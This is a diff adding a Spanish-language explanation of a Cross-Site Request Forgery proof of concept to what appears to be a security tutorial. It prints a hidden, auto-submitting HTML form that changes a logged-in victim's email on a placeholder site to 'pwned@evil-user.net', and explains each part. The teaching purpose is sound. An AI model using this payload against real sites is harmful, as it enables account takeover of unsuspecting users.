@@ -62,6 +62,62 @@ El atacante puede crear una página HTML maliciosa como esta:
   </body>
 </html>
 ```
+Este fragmento de código representa una prueba de concepto (PoC) para explotar una vulnerabilidad de tipo **Cross-Site Request Forgery (CSRF)**. A continuación se detalla el funcionamiento de cada parte del documento y su implicancia en el ataque.
+
+---
+
+## 🔍 Contexto general
+
+La página fue creada por un atacante con el objetivo de inducir a un usuario autenticado a **enviar una solicitud POST maliciosa** al sitio `vulnerable-website.com`, sin que el usuario lo sepa.
+
+El objetivo es cambiar el email de la cuenta del usuario víctima por `pwned@evil-user.net`.
+
+---
+
+## 🗋 Estructura del HTML
+
+```html
+<html>
+    <body>
+        <form action="https://vulnerable-website.com/email/change" method="POST">
+            <input type="hidden" name="email" value="pwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
+</html>
+```
+
+### ✉️ Formulario oculto
+
+```html
+<form action="https://vulnerable-website.com/email/change" method="POST">
+    <input type="hidden" name="email" value="pwned@evil-user.net" />
+</form>
+```
+
+* El formulario está configurado para enviar una solicitud POST a `https://vulnerable-website.com/email/change`.
+* El campo `email` tiene un valor oculto (`hidden`) que representa el correo malicioso al que el atacante quiere cambiar la cuenta del usuario.
+* Este formulario no tiene botones visibles para el usuario.
+
+### 👉 Envió automático con JavaScript
+
+```html
+<script>
+    document.forms[0].submit();
+</script>
+```
+
+* Apenas se carga la página, el navegador ejecuta este script.
+* El script selecciona el primer formulario de la página (`forms[0]`) y lo **envía automáticamente**.
+* Si el usuario está logueado en `vulnerable-website.com`, su navegador enviará también la cookie de sesión.
+
+---
+
+##
+
+---
 
 Si el usuario víctima visita esta página mientras está autenticado en el sitio vulnerable:
 
